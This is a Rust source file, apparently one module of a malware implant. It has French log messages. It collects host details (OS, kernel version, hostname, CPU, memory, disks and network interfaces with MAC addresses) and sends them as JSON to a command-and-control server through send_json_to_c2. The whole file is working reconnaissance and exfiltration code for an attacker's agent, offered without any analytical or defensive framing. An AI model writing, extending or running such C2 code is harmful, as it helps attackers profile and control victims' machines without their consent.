use crate::connexion::send_json_to_c2;
use anyhow::Result;
use serde_json::json;
use sysinfo::{Disks, Networks, System};

pub async fn get_sysinfo() -> Result<()> {
    println!("[logs] Début de la récupération des infos système...");
    let mut sys = System::new();
    println!("[logs] Rafraîchissement des infos système...");
    sys.refresh_all();

    println!("[logs] Récupération des disques...");
    let disks = Disks::new_with_refreshed_list();
    let disk_details: Vec<_> = disks
        .iter()
        .map(|disk| {
            let total = disk.total_space() as f64;
            let available = disk.available_space() as f64;
            let used = total - available;

            json!({
                "name": disk.name().to_string_lossy(),
                "mount_point": disk.mount_point().to_string_lossy(),
                "total_gb": (total / 1_073_741_824.0).round(),
                "free_gb": (available / 1_073_741_824.0).round(),
                "used_gb": (used / 1_073_741_824.0).round(),
                "usage_percent": if total > 0.0 {
                    (used / total * 100.0).round()
                } else {
                    0.0
                },
                "filesystem": disk.file_system().to_string_lossy(),
            })
        })
        .collect();
    
    println!("[logs] {} disques trouvés", disk_details.len());

    println!("[logs] Récupération des réseaux...");
    let networks = Networks::new_with_refreshed_list();
    let network_details: Vec<_> = networks
        .iter()
        .map(|(interface_name, data)| {
            json!({
                "interface": interface_name,
                "mac_address": data.mac_address().to_string(),
            })
        })
        .collect();
    
    println!("[logs] {} interfaces réseau trouvées", network_details.len());

    let cpu_info = json!({
        "cores": sys.cpus().len(),
        "brand": sys.cpus().first().map(|cpu| cpu.brand()).unwrap_or("Unknown"),
        "frequency_mhz": sys.cpus().first().map(|cpu| cpu.frequency()).unwrap_or(0),
    });

    let memory_info = json!({
        "total_mb": sys.total_memory() / 1024,
    });

    let json = json!({
        "Name": System::name().unwrap_or_else(|| "Unknown".to_string()),
        "Kernel Version": System::kernel_version().unwrap_or_else(|| "Unknown".to_string()),
        "System OS Version": System::os_version().unwrap_or_else(|| "Unknown".to_string()),
        "System hostname": System::host_name().unwrap_or_else(|| "Unknown".to_string()),
        "CPU": cpu_info,
        "Memory": memory_info,
        "Disks Details": disk_details,
        "Total Disks": disks.len(),
        "Network Details": network_details,
    });

    println!("[logs] Envoi des données au C2...");
    send_json_to_c2(&json).await?;
    println!("[logs] Données envoyées au C2");
    Ok(())
}
